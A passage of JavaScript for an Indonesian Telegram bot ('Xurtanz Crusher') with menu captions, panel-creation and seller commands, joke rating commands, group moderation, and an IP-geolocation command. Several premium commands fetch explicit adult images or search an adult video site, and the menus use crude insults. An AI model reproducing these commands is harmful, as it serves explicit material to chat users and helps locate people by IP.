⌑ /cekkontol ᴄᴇᴋ sᴇʙᴀʀᴀᴘᴀ ʙᴇsᴀʀ ᴋᴏɴᴛᴏʟᴍᴜ
⌑ /cekganteng ᴄᴇᴋ ᴋᴇɢᴀɴᴛᴇɴɢᴀɴᴍᴜ

Click button di bawah ini untuk melanjutkan menu
</pre>
`;
      replyMarkup = { inline_keyboard: [
      [
       { text: "⬅️ Back", callback_data: "tmptmd" }
      ],
    ] 
  };
    }
    
    if (query.data === "mdmenu2") {
      caption = `
<pre>JavaScript</pre>
<pre>Xurtanz Crusher 
System Script By @XurooStore

𝐌𝐃 𝐌𝐄𝐍𝐔 𝟐
⌑ /quotesgalau ᴋᴀᴛᴀ ᴋᴀᴛᴀ ɢᴀʟᴀᴜ
⌑ /motivasi ᴍᴏᴛɪᴠᴀsɪ
⌑ /suit sᴜɪᴛ
⌑ /tourl - ғᴏᴛᴏ
⌑ /stiktok - ʙᴇʙᴀs
⌑ /brat - ʙᴇʙᴀs
⌑ /qc - ʙᴇʙᴀ𝘀
⌑ /hentai - ɢᴀᴛᴀᴜ ʟᴀʜ ᴄᴇᴋ ᴀᴊᴀ
⌑ /trap - ɢᴀᴛᴀᴜ ʟᴀʜ ᴄᴇᴋ ᴀᴊᴀ
⌑ /animetickle - ɢᴀᴛᴀᴜ ʟᴀʜ ᴄᴇᴋ ᴀᴊᴀ
⌑ /nulis - ɢᴀᴛᴀᴜ ʟᴀʜ ᴄᴇᴋ ᴀᴊᴀ
⌑ /bocilwindah - ɢᴀᴛᴀᴜ ʟᴀʜ ᴄᴇᴋ ᴀᴊᴀ
⌑ /sertifikattolol - ɢᴀᴛᴀᴜ ʟᴀʜ ᴄᴇᴋ ᴀᴊᴀ
⌑ /trackip - ɢᴀᴛᴀᴜ ʟᴀʜ ᴄᴇᴋ ᴀᴊᴀ

Click button di bawah ini untuk melanjutkan menu
</pre>
`;
    
    replyMarkup = { inline_keyboard: [
      [
       { text: "⬅️ Back", callback_data: "tmptmd" }
      ],
    ] 
  };
    }
    
    if (query.data === "mdmenu3") {
      caption = `
<pre>JavaScript</pre>
<pre>Xurtanz Crusher 
System Script By @XurooStore

𝐌𝐃 𝐌𝐄𝐍𝐔 𝟑
⌑ /dunia - ɢᴀᴛᴀᴜ ᴄᴇᴋ ᴀᴊᴀ
⌑ /cekkhodam - ᴄᴇᴋ ᴋʜᴏᴅᴀᴍ 2
⌑ /cektampan - ᴄᴇᴋ ɢᴀɴᴛᴇɴɢ ʟᴜ 2
⌑ /cekcantik - ᴄᴇᴋ ᴄᴀɴᴛɪᴋ ʟᴜ
⌑ /cekjanda - ᴄᴇᴋ ᴋᴇᴊᴀɴᴅᴀᴀɴ ʟᴜ
⌑ /cekkaya - ᴄᴇᴋ ᴋᴇᴋᴀʏᴀᴀɴ ʟᴜ
⌑ /cekmiskin - ᴄᴇᴋ ᴋᴇᴍɪsᴋɪɴᴀɴ ʟᴜ

Click button di bawah ini untuk melanjutkan menu
</pre>
`;
   
   replyMarkup = { inline_keyboard: [
      [
       { text: "⬅️ Back", callback_data: "tmptmd" }
      ],
    ]
  };
    }
    
    if (query.data === "mdmenu4") {
      caption = `
<pre>JavaScript</pre>
<pre>Xurtanz Crusher 
System Script By @XurooStore

𝐌𝐃 𝐌𝐄𝐍𝐔 𝟒
⌑ /ceksabar - ᴄᴇᴋ ᴋᴇsᴀʙᴀʀᴀɴ ʟᴜ
⌑ /cekpacar - ᴄᴇᴋ ᴘᴀᴄᴀʀ ʟᴜ
⌑ /cektolol - ᴄᴇᴋ ᴋᴇᴛᴏʟᴏʟᴀɴ ʟᴜ
⌑ /cekmati - ᴄᴇᴋ ᴋᴇᴍᴀᴛɪᴀɴ ʟᴜ
⌑ /nwaifu - ɢᴀᴛᴀᴜ ʟᴀʜ ᴄᴇᴋ ᴀᴊᴀ
⌑ /animefoxgirl - ɢᴀᴛᴀᴜ ʟᴀʜ ᴄᴇᴋ ᴀᴊᴀ
⌑ /animegecg - ɢᴀᴛᴀᴜ ʟᴀʜ ᴄᴇᴋ ᴀᴊᴀ
⌑ /hentai - ɢᴀᴛᴀᴜ ʟᴀʜ ᴄᴇᴋ ᴀᴊᴀ
⌑ /trap - ɢᴀᴛᴀᴜ ʟᴀʜ ᴄᴇᴋ ᴀᴊᴀ
⌑ /animetickle - ɢᴀᴛᴀᴜ ʟᴀʜ ᴄᴇᴋ ᴀᴊᴀ

Click button di bawah ini untuk melanjutkan menu
</pre>
`;
    
    replyMarkup = { inline_keyboard: [
      [
       { text: "⬅️ Back", callback_data: "tmptmd" }
      ],
    ]
  };
    }
    
    if (query.data === "create") {
      caption = `
<pre>JavaScript</pre>
<pre>Xurtanz Crusher 
System Script By @XurooStore

𝐂𝐑𝐄𝐀𝐓𝐄 𝐏𝐀𝐍𝐄𝐋
> /unli
> /1gb
> /2gb
> /3gb
> /4gb
> /5gb
> /6gb
> /7gb
> /8gb
> /9gb
> /10gb
> /addsellerpanel 
> /delsellerpanel

Click button di bawah ini untuk melanjutkan menu
</pre>
`;
     
     replyMarkup = { inline_keyboard: [
      [
            { text: "⬅️ Back", callback_data: "tmptmd" },
            { text: "King", url: "https://t.me/XurooStore" },
            { text: "➡️ Next", callback_data: "trashfc" }
      ]
    ] 
  };
    }
    
    if (query.data === "thanksto") {
      caption = `
<pre>JavaScript</pre>
<pre>Xurtanz Crusher 
System Script By @XurooStore

𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎𝐎
XurooStore ( Author )
Xwarxr ( Support )
lang ( Support )
angkasa (support)
Tanzshiki ( My Friend )

Click button di bawah ini untuk melanjutkan menu
</pre>
`;
      replyMarkup = { inline_keyboard: [
      [
            { text: "⬅️ Back", callback_data: "trashfc" },
            { text: "King", url: "https://t.me/XurooStore" },
            { text: "Home", callback_data: "back_to_main" }
      ]
    ] 
  };
    }

    if (query.data === "back_to_main") {
      caption = `
<pre>JavaScript</pre>
<pre>TREDICT STORM
System Script By @XurooStore

𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐂𝐑𝐈𝐏𝐓
⚔ King : @XurooStore
📁 Version : 2 Lite
🀄️ Status Prem : ${premiumStatus}
🫀 Id : ${senderId}
☠️ Runtime : ${runtime}
❤️‍🔥 Username : ${username}

Click button di bawah ini untuk melanjutkan menu
</pre>
`;
      replyMarkup = {
     inline_keyboard: [
     [
            { text: "⬅️ Back", callback_data: "back_to_main" },
            { text: "King", url: "https://t.me/XurooStore" },
            { text: "➡️ Next", callback_data: "accesmenu" }
      ]
  ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "video",
        media: vidthumbnail,
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

// ~ Fun And Tools Menu


bot.onText(/^\/1gb (.+)/, (msg, match) => {
  const [username, u] = match[1].split(',');
  if (!username || !u) return bot.sendMessage(msg.chat.id, '⚠️ Format: /1gb username,idtele');
  createPanel(bot, msg.from.id, username.trim(), u.trim(), '1000', '40', '1000', '1GB');
});

bot.onText(/^\/2gb (.+)/, (msg, match) => {
  const [username, u] = match[1].split(',');
  if (!username || !u) return bot.sendMessage(msg.chat.id, '⚠️ Format: /2gb username,idtele');
  createPanel(bot, msg.from.id, username.trim(), u.trim(), '2000', '60', '1000', '2GB');
});

bot.onText(/^\/3gb (.+)/, (msg, match) => {
  const [username, u] = match[1].split(',');
  if (!username || !u) return bot.sendMessage(msg.chat.id, '⚠️ Format: /3gb username,idtele');
  createPanel(bot, msg.from.id, username.trim(), u.trim(), '3000', '80', '2000', '3GB');
});

bot.onText(/^\/4gb (.+)/, (msg, match) => {
  const [username, u] = match[1].split(',');
  if (!username || !u) return bot.sendMessage(msg.chat.id, '⚠️ Format: /4gb username,idtele');
  createPanel(bot, msg.from.id, username.trim(), u.trim(), '4000', '100', '2000', '4GB');
});

bot.onText(/^\/5gb (.+)/, (msg, match) => {
  const [username, u] = match[1].split(',');
  if (!username || !u) return bot.sendMessage(msg.chat.id, '⚠️ Format: /5gb username,idtele');
  createPanel(bot, msg.from.id, username.trim(), u.trim(), '5000', '120', '3000', '5GB');
});

bot.onText(/^\/6gb (.+)/, (msg, match) => {
  const [username, u] = match[1].split(',');
  if (!username || !u) return bot.sendMessage(msg.chat.id, '⚠️ Format: /6gb username,idtele');
  createPanel(bot, msg.from.id, username.trim(), u.trim(), '6000', '140', '3000', '6GB');
});

bot.onText(/^\/7gb (.+)/, (msg, match) => {
  const [username, u] = match[1].split(',');
  if (!username || !u) return bot.sendMessage(msg.chat.id, '⚠️ Format: /7gb username,idtele');
  createPanel(bot, msg.from.id, username.trim(), u.trim(), '7000', '160', '4000', '7GB');
});

bot.onText(/^\/8gb (.+)/, (msg, match) => {
  const [username, u] = match[1].split(',');
  if (!username || !u) return bot.sendMessage(msg.chat.id, '⚠️ Format: /8gb username,idtele');
  createPanel(bot, msg.from.id, username.trim(), u.trim(), '8000', '180', '4000', '8GB');
});

bot.onText(/^\/9gb (.+)/, (msg, match) => {
  const [username, u] = match[1].split(',');
  if (!username || !u) return bot.sendMessage(msg.chat.id, '⚠️ Format: /9gb username,idtele');
  createPanel(bot, msg.from.id, username.trim(), u.trim(), '9000', '200', '5000', '9GB');
});

bot.onText(/^\/10gb (.+)/, (msg, match) => {
  const [username, u] = match[1].split(',');
  if (!username || !u) return bot.sendMessage(msg.chat.id, '⚠️ Format: /10gb username,idtele');
  createPanel(bot, msg.from.id, username.trim(), u.trim(), '10000', '220', '5000', '10GB');
});

bot.onText(/^\/unli (.+)/, (msg, match) => {
  const [username, u] = match[1].split(',');
  if (!username || !u) return bot.sendMessage(msg.chat.id, '⚠️ Format: /unli username,idtele');
  createPanel(bot, msg.from.id, username.trim(), u.trim(), '0', '0', '0', 'Unlimited');
});

bot.onText(/^\/addsellerpanel (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (String(msg.from.id) !== String(OWNER_ID))
    return bot.sendMessage(chatId, `<blockquote>❌ Hanya owner yang bisa menambah seller.</blockquote>`, {
    parse_mode: "HTML"
  });

  const sellerId = parseInt(match[1]);
  const data = getSellerList();

  if (!data.sellers.includes(sellerId)) {
    data.sellers.push(sellerId);
    saveSellerList(data);
    bot.sendMessage(chatId, `<blockquote>✅ Seller dengan ID ${sellerId} berhasil ditambahkan.</blockquote>`, {
    parse_mode: "HTML"
  });
  } else {
    bot.sendMessage(chatId, `<blockquote>⚠️ Seller dengan ID ${sellerId} sudah ada.</blockquote>`, {
    parse_mode: "HTML"
  });
  }
});

bot.onText(/^\/delsellerpanel (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (String(msg.from.id) !== String(OWNER_ID))
    return bot.sendMessage(chatId, `<blockquote>❌ Hanya owner yang bisa menghapus seller.</blockquote>`, {
    parse_mode: "HTML"
  });

  const sellerId = parseInt(match[1]);
  const data = getSellerList();

  if (data.sellers.includes(sellerId)) {
    data.sellers = data.sellers.filter(id => id !== sellerId);
    saveSellerList(data);
    bot.sendMessage(chatId, `<blockquote>🗑️ Seller ${sellerId} dihapus.</blockquote>`, {
    parse_mode: "HTML"
  });
  } else {
    bot.sendMessage(chatId, `<blockquote>⚠️ Seller ${sellerId} tidak ditemukan.</blockquote>`, {
    parse_mode: "HTML"
  });
  }
});











bot.onText(/\/stiktok(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const keyword = match[1]?.trim() || msg.reply_to_message?.text?.trim();

  if (!keyword) {
    return bot.sendMessage(chatId, '❌ Mohon masukkan kata kunci. Contoh: /stiktok sad');
  }

  try {
    const response = await axios.post('https://api.siputzx.my.id/api/s/tiktok', {
      query: keyword
    }, {
      headers: { 'Content-Type': 'application/json' }
    });

    const data = response.data;
    if (!data.status || !Array.isArray(data.data) || data.data.length === 0) {
      return bot.sendMessage(chatId, '⚠️ Tidak ditemukan video TikTok dengan kata kunci tersebut.');
    }

    const videos = data.data.slice(0, 3);
    let replyText = `🔎 Hasil pencarian TikTok untuk: *${keyword}*\n\n`;

    for (const video of videos) {
      const title = video.title?.trim() || 'Tanpa Judul';
      replyText += `🎬 *${title}*\n`;
      replyText += `👤 ${video.author.nickname} (@${video.author.unique_id})\n`;
      replyText += `▶️ [Link Video](${video.play})\n`;
      replyText += `🎵 Musik: ${video.music_info.title} - ${video.music_info.author}\n`;
      replyText += `⬇️ [Download WM](${video.wmplay})\n\n`;
    }

    bot.sendMessage(chatId, replyText, { parse_mode: 'Markdown' });

  } catch (error) {
    console.error(error?.response?.data || error.message);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil data TikTok.');
  }
});
bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];

  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});
bot.onText(/^\/unmute(?:\s+@?(\w+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  // hanya bisa di grup
  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "⚠️ Command ini hanya bisa dipakai di grup.");
  }

  // harus reply atau sebut username
  const repliedUser = msg.reply_to_message?.from;
  const username = match[1];
  let targetUser;

  if (repliedUser) {
    targetUser = repliedUser;
  } else if (username) {
    // ambil member dari username
    try {
      const members = await bot.getChatAdministrators(chatId);
      targetUser = members.find(m => m.user.username?.toLowerCase() === username.toLowerCase())?.user;
    } catch (e) {
      console.error("Gagal ambil member:", e.message);
    }
  }

  if (!targetUser) {
    return bot.sendMessage(chatId, "❌ Balas pesan user atau sebut username untuk unmute.");
  }

  try {
    await bot.restrictChatMember(chatId, targetUser.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false
      }
    });

    bot.sendMessage(chatId, `✅ User [${targetUser.first_name}](tg://user?id=${targetUser.id}) sudah di-*unmute*.`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error("Error unmute:", err.message);
    bot.sendMessage(chatId, "❌ Gagal unmute user. Pastikan bot punya izin admin.");
  }
});

bot.onText(/^\/mute$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus reply pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-mute.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah yang memanggil adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Mute user: hanya non-admin yang bisa dimute
        await bot.restrictChatMember(chatId, targetUser.id, {
            permissions: {
                can_send_messages: false,
                can_send_media_messages: false,
                can_send_polls: false,
                can_send_other_messages: false,
                can_add_web_page_previews: false,
                can_change_info: false,
                can_invite_users: false,
                can_pin_messages: false
            }
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-mute.`,
            { parse_mode: 'Markdown' });

        // Balas pesan yang dimute
        await bot.sendMessage(chatId,
            '🚫 *Pengguna telah di-mute di grup ini oleh admin.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat mute:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan mute.');
    }
});

bot.onText(/\/trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1];

  if (!ip) {
    return bot.sendMessage(chatId, "⚠️ Format: /trackip <IP>\nContoh: /trackip 8.8.8.8");
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak IP...");

  try {
    const res = await fetch(`https://ipwhois.app/json/${ip}`);
    const data = await res.json();

    if (!data.success) {
      return bot.sendMessage(chatId, "❌ Error: IP tidak valid atau gagal dilacak.");
    }

    const text = `
📍 *IP Tracking Result*
━━━━━━━━━━━━━━━━━━
🌐 *IP:* ${data.ip}
🏳️ *Country:* ${data.country}
📍 *Region:* ${data.region}
🏙️ *City:* ${data.city}
📮 *ZIP:* ${data.postal}
🕒 *Timezone:* ${data.timezone_gmt}
💻 *ISP:* ${data.isp}
🏢 *Org:* ${data.org}
🔢 *ASN:* ${data.asn}
📡 *Lat/Lon:* ${data.latitude}, ${data.longitude}
━━━━━━━━━━━━━━━━━━
[🌍 View on Google Maps](https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude})
`;

    // Kirim detail teks
    await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });

    // Kirim pin lokasi langsung di Telegram
    await bot.sendLocation(chatId, data.latitude, data.longitude);

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data IP.");
  }
});

bot.onText(/^\/sertifikattolol(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1]; // teks setelah perintah

  // Jika tidak ada teks
  if (!text) {
    return bot.sendMessage(
      chatId,
      "❗ Silakan masukkan teks untuk sertifikat.\n\nContoh: `/sertifikattolol Jamal`",
      { parse_mode: "Markdown" }
    );
  }

  const apiUrl = `https://api.siputzx.my.id/api/m/sertifikat-tolol?text=${encodeURIComponent(text)}`;

  try {
    // Kirim pesan status
    await bot.sendMessage(chatId, "🖼️ Membuat sertifikat tolol, tunggu sebentar...");

    // Cek apakah URL valid / bisa diakses
    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");

    // Kirim foto ke Telegram
    await bot.sendPhoto(chatId, buffer, {
      caption: `😂 *Sertifikat Tolol Untuk ${text}*`,
      parse_mode: "Markdown"
    });

  } catch (err) {
    console.error("Gagal mengambil gambar:", err.message);
    await bot.sendMessage(
      chatId,
      "❌ Gagal mengambil gambar. Pastikan API aktif atau coba lagi nanti!"
    );
  }
});

bot.onText(/\/bocilwindah (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const q = match[1]; // ambil teks setelah command

  try {
    if (!q) {
      return bot.sendMessage(chatId, `\`Penggunaan\`\nContoh: /bocilwindah Yanto`, {
        parse_mode: 'Markdown'
      });
    }

    const texts = [
      "Bocil Panik", "Bocil Kematian", "Bocil Gim Horor", "Bocil Toxic",
      "Bocil GG", "Bocil Emot Marah", "Bocil Poroba", "Bocil Estetik",
      "Bocil Sus", "Bocil Nakal", "Bocil Curang", "Bocil Introvert",
      "Bocil Nolep", "Bocil Maghrib", "Bocil Epep", "Bocil Absen",
      "Bocil Gaming", "Bocil Panik", "Bocil Boros", "Bocil Kikir",
      "Bocil Alesan", "Bocil Anomali", "Bocil Rugi", "Bocil Extrovert",
      "Bocil Baik"
    ];

    const randomText = texts[Math.floor(Math.random() * texts.length)];

    // Delay 1 detik seperti di WA
    await new Promise(resolve => setTimeout(resolve, 1000));

    await bot.sendMessage(chatId, `*Ternyata ${q} ${randomText}*`, {
      parse_mode: 'Markdown'
    });

  } catch (err) {
    console.error(err);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${err.message}`);
  }
});

async function showProgress(bot, chatId, messageId, steps = 5, delay = 400) {
  const bars = ["[░░░░░]", "[█░░░░]", "[██░░░]", "[███░░]", "[████░]", "[█████]"];
  for (let i = 0; i <= steps; i++) {
    const idx = Math.min(i, bars.length - 1);
    const text =
      i < steps ? `⌛ Sedang menulis...\n${bars[idx]}` : `✅ Selesai menulis!\n${bars[idx]}`;
    try {
      await bot.editMessageText(text, { chat_id: chatId, message_id: messageId });
    } catch (e) {}
    await new Promise((r) => setTimeout(r, delay));
  }
}

bot.onText(/^\/nulis(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match && match[1] ? match[1].trim() : "";

  // Jika tidak ada teks
  if (!text) {
    return bot.sendMessage(chatId, "Mau nulis apa? Contoh:\n`/nulis mbape ganteng`", {
      parse_mode: "Markdown",
    });
  }

  try {
    const progressMsg = await bot.sendMessage(chatId, "⌛ Sedang menulis...\n[░░░░░]");

    await showProgress(bot, chatId, progressMsg.message_id, 5, 400);

    const response = await axios.post(
      "https://lemon-write.vercel.app/api/generate-book",
      {
        text,
        font: "default",
        color: "#000000",
        size: "32",
      },
      {
        responseType: "arraybuffer",
        headers: { "Content-Type": "application/json" },
      }
    );

    try {
      await bot.deleteMessage(chatId, progressMsg.message_id);
    } catch (e) {}

    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: "📖 Hasil tulisan kamu!",
    });
  } catch (error) {
    console.error("❌ Nulis error:", error.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan, coba lagi nanti ya.");
  }
});

bot.onText(/^\/animefoxgirl$/, async (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, "⏳ Tunggu Sebentarr");

  try {
    const waifudd = await axios.get("https://nekos.life/api/v2/img/fox_girl");

    await bot.sendPhoto(chatId, waifudd.data.url, {
      caption: "✅ SUCCES NIH BANG"
    });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error mengambil gambar!");
  }
});

bot.onText(/^\/animetickle$/, async (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, "⏳ Tunggu Sebentarr");

  try {
    const waifudd = await axios.get("https://nekos.life/api/v2/img/tickle");

    await bot.sendPhoto(chatId, waifudd.data.url, {
      caption: "✅ SUCCES NIH BANG"
    });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error mengambil gambar!");
  }
});

bot.onText(/^\/animegecg$/, async (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, "⏳ Tunggu Sebentarr");

  try {
    const waifudd = await axios.get("https://nekos.life/api/v2/img/gecg");

    await bot.sendPhoto(chatId, waifudd.data.url, {
      caption: "✅ SUCCES NIH BANG"
    });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error mengambil gambar!");
  }
});

bot.onText(/^\/trap$/, async (msg) => {
  const chatId = msg.chat.id;
  if (!premiumUsers.includes(msg.from.id)) {
    return resricted(msg.from.id);
  }
  bot.sendMessage(chatId, "⏳ WAIT TUNGGU TOD");

  try {
    const waifudd = await axios.get("https://waifu.pics/api/nsfw/trap");

    await bot.sendPhoto(chatId, waifudd.data.url, {
      caption: "✅ SUCCES NI COK"
    });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error mengambil gambar!");
  }
});


// Command: /hentai
bot.onText(/^\/hentai$/, async (msg) => {
  const chatId = msg.chat.id;
  if (!premiumUsers.includes(msg.from.id)) {
    return resricted(msg.from.id);
  }
  bot.sendMessage(chatId, "⏳ Prosess Mengambil Gambar");

  try {
    const waifudd = await axios.get("https://waifu.pics/api/nsfw/neko");

    await bot.sendPhoto(chatId, waifudd.data.url, {
      caption: "✅ Succes"
    });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error mengambil gambar!");
  }
});

// Command: /nwaifu
bot.onText(/^\/nwaifu$/, async (msg) => {
  const chatId = msg.chat.id;
  if (!premiumUsers.includes(msg.from.id)) {
    return resricted(msg.from.id);
  }
  bot.sendMessage(chatId, "⏳ WAIT TUNGGU TOD");

  try {
    const waifudd = await axios.get("https://waifu.pics/api/nsfw/waifu");

    await bot.sendPhoto(chatId, waifudd.data.url, {
      caption: "✅ SUCCES NI COK"
    });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error mengambil gambar!");
  }
});


bot.onText(/^\/xnxx(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) {
    return bot.sendMessage(chatId, '🔍 Contoh penggunaan:\n/xnxx jepang');
  }

  try {
    const res = await axios.get('https://www.ikyiizyy.my.id/search/xnxx', {
      params: {
        apikey: 'new',
        q: query
      }
    });

    const results = res.data.result;

    if (!results || results.length === 0) {
      return bot.sendMessage(chatId, `❌ Tidak ditemukan hasil untuk: *${query}*`, { parse_mode: 'Markdown' });
    }

    const text = results.slice(0, 3).map((v, i) => (
      `📹 *${v.title}*\n🕒 Durasi: ${v.duration}\n🔗 [Tonton Sekarang](${v.link})`
    )).join('\n\n');

    bot.sendMessage(chatId, `🔞 Hasil untuk: *${query}*\n\n${text}`, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });

  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil data.');
  }
});
bot.onText(/^\/faktaunik$/, async (msg) => {
  const chatId = msg.chat.id;

  
  // Daftar fakta unik — bisa kamu tambah sesuka hati
  const fakta = [
    "💡 Lebah bisa mengenali wajah manusia!",
    "🌎 Gunung Everest tumbuh sekitar 4 milimeter setiap tahun.",
    "🐙 Gurita memiliki tiga jantung dan darah berwarna biru.",
    "🧊 Air panas bisa membeku lebih cepat daripada air dingin — disebut efek Mpemba.",
    "🚀 Jejak kaki di bulan akan bertahan jutaan tahun karena tidak ada angin.",
    "🐘 Gajah tidak bisa melompat, satu-satunya mamalia besar yang tidak bisa.",
    "🦋 Kupu-kupu mencicipi dengan kakinya!",
    "🔥 Matahari lebih putih daripada kuning jika dilihat dari luar atmosfer.",
    "🐧 Penguin jantan memberikan batu kepada betina sebagai tanda cinta.",
    "🌕 Di Venus, satu hari lebih panjang daripada satu tahunnya!"
  ];

  // Pilih fakta secara acak
  const randomFakta = fakta[Math.floor(Math.random() * fakta.length)];
    
  await bot.sendMessage(chatId, `🎲 *Fakta Unik Hari Ini:*\n\n${randomFakta}`, {
    parse_mode: "Markdown",
  });
});

bot.onText(/^\/cektampan$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  try {

  const nilai = [10, 20, 30, 35, 45, 50, 54, 68, 73, 78, 83, 90, 94, 100][Math.floor(Math.random() * 14)];
  const teks = `<blockquote><b>📊 HASIL TES KETAMPANAN</b>
<b>👤 Nama: ${msg.from.first_name}</b>
<b>💯 Nilai: ${nilai}%</b>
<b>🗣️ Komentar: ${komentarTampan(nilai)}</b>
</blockquote>`;
  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `<blockquote>❌ Terjadi kesalahan saat pengecekan status keanggotaan grup/channel.</blockquote>`, {
    parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/cekcantik$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  try {
    

  const nilai = [10, 20, 30, 35, 45, 50, 54, 68, 73, 78, 83, 90, 94, 100][Math.floor(Math.random() * 14)];
  const teks = `<blockquote><b>📊 HASIL TES KECANTIKAN</b>
<b>👤 Nama: ${msg.from.first_name}</b>
<b>💯 Nilai: ${nilai}%</b>
<b>🗣️ Komentar: ${komentarCantik(nilai)}</b>
</blockquote>`.trim();

  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
  } catch (error) {
    bot.sendMessage(chatId, `<blockquote>❌ Terjadi kesalahan saat pengecekan status keanggotaan grup/channel.</blockquote>`, {
    parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/cekkaya$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  try {
    
    
  const nilai = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100][Math.floor(Math.random() * 10)];
  const teks = `<blockquote><b>💵 HASIL TES KEKAYAAN</b>
<b>👤 Nama: ${msg.from.first_name}</b>
<b>💰 Nilai: ${nilai}%</b>
<b>🗣️ Komentar: ${komentarKaya(nilai)}</b>
</blockquote>`.trim();

  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
  } catch (error) {
    bot.sendMessage(chatId, `<blockquote>❌ Terjadi kesalahan saat pengecekan status keanggotaan grup/channel.</blockquote>`, {
    parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/cekmiskin$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  try {
    
   
  const nilai = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100][Math.floor(Math.random() * 10)];
  const teks = `<blockquote><b>📉 HASIL TES KEMISKINAN</b>
<b>👤 Nama: ${msg.from.first_name}</b>
<b>📉 Nilai: ${nilai}%</b>
<b>🗣️ Komentar: ${komentarMiskin(nilai)}</b>
</blockquote>`.trim();

  bot.sendMessage(chatId, teks, { parse_mode: 'HTML' });
